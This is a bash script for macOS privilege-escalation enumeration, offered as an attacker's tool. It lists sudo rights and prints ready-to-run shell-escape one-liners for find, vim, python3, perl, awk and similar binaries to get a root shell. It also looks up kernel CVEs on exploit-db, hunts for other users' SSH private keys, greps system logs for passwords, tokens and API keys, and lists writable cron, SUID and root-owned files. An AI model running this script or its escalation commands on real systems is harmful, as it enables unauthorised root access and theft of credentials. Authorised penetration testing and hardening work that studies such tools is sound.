#!/bin/bash

# Define log file
LOG_FILE="mac_enum.log"

# Clear previous log
> "$LOG_FILE"

# Central logging function
log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

log "[*] Running enhanced MacOS privilege escalation enumeration script..."
log "[*] Results will be saved in $LOG_FILE"

# ------------------- SYSTEM ENUMERATION -------------------
log "\n[+] Host Information:"
log "Hostname: $(scutil --get ComputerName)"
log "OS: $(sw_vers -productName) $(sw_vers -productVersion) $(sw_vers -buildVersion)"
log "Architecture: $(uname -m)"

KERNEL_VERSION=$(uname -r)
log "\n[+] Kernel and CPU Information:"
log "Kernel Version: $KERNEL_VERSION"

# ------------------- PRIVILEGE ESCALATION CHECKS -------------------
log "\n[+] Checking Sudo Capabilities:"
SUDO_CMDS=$(sudo -l 2>/dev/null)

if [[ -z "$SUDO_CMDS" ]]; then
    log "[-] No sudo privileges detected."
else
    log "$SUDO_CMDS"

    if sudo -l | grep -q "NOPASSWD"; then
        log "[!] Some sudo commands can be run without a password!"
    fi

    declare -A SUDO_EXPLOITS=(
        ["find"]="sudo find . -exec /bin/sh \; -quit"
        ["vim"]="sudo vim -c ':!/bin/sh'"
        ["python3"]="sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
        ["perl"]="sudo perl -e 'exec \"/bin/sh\";'"
        ["awk"]="sudo awk 'BEGIN {system(\"/bin/sh\")}'"
        ["nmap"]="sudo nmap --interactive; !sh"
        ["less"]="sudo less /etc/passwd; !sh"
        ["nano"]="sudo nano /etc/sudoers"
        ["bash"]="sudo bash"
        ["sh"]="sudo sh"
        ["lua"]="sudo lua -e 'os.execute(\"/bin/sh\")'"
        ["ruby"]="sudo ruby -e 'exec \"/bin/sh\"'"
    )

    for CMD in "${!SUDO_EXPLOITS[@]}"; do
        if echo "$SUDO_CMDS" | grep -q "$CMD"; then
            log "[!] Exploitation Tip: Run: ${SUDO_EXPLOITS[$CMD]}"
        fi
    done
fi

# ------------------- KERNEL EXPLOIT SUGGESTIONS -------------------
log "\n[+] Searching for Known Kernel Exploits:"
curl -s "https://www.exploit-db.com/search?text=macOS+$KERNEL_VERSION" | grep -o 'CVE-[0-9]\{4\}-[0-9]\{4,5\}' | sort -u | tee -a "$LOG_FILE"

# ------------------- CRON JOB EXPLOIT CHECK -------------------
log "\n[+] Checking for Scheduled Cron Jobs:"
CRON_JOBS=$(crontab -l 2>/dev/null; cat /etc/crontab /etc/periodic/*/* 2>/dev/null)

if [[ -n "$CRON_JOBS" ]]; then
    log "$CRON_JOBS"
    log "[+] Checking for Writable Cron Scripts:"
    WRITABLE_CRON_SCRIPTS=$(find /etc/periodic* -type f -writable 2>/dev/null)
    
    if [[ -n "$WRITABLE_CRON_SCRIPTS" ]]; then
        log "$WRITABLE_CRON_SCRIPTS"
    fi
else
    log "[-] No cron jobs found."
fi

# ------------------- SUID & SGID BINARY CHECK -------------------
log "\n[+] Searching for SUID binaries:"
find / -perm -4000 -type f 2>/dev/null | tee -a "$LOG_FILE"

# ------------------- LATERAL MOVEMENT CHECKS -------------------
log "\n[+] Checking for Readable Home Directories:"
find /Users -maxdepth 1 -type d -perm -o+r 2>/dev/null | tee -a "$LOG_FILE"

log "\n[+] Searching for Other Users' SSH Private Keys:"
find /Users -type f -name "id_rsa" -o -name "*.pem" 2>/dev/null | tee -a "$LOG_FILE"

# ------------------- CREDENTIAL DISCOVERY -------------------
log "\n[+] Checking logs for sensitive information (passwords, tokens, API keys):"
grep -rniE "password|passwd|token|apikey|secret" /var/log 2>/dev/null | tee -a "$LOG_FILE"

# ------------------- FILE PERMISSION EXPLOITATION -------------------
log "\n[+] Checking for Writable Security Files:"
find /etc -type f -perm -g=w,o=w 2>/dev/null | tee -a "$LOG_FILE"

log "\n[+] Searching for Writable Root-Owned Scripts:"
find /usr/local/bin /usr/bin /bin /sbin -type f -perm -002 -user root 2>/dev/null | tee -a "$LOG_FILE"

# ------------------- ENUMERATION COMPLETED -------------------
log "\n[+] Enumeration completed. Check results in: $LOG_FILE"
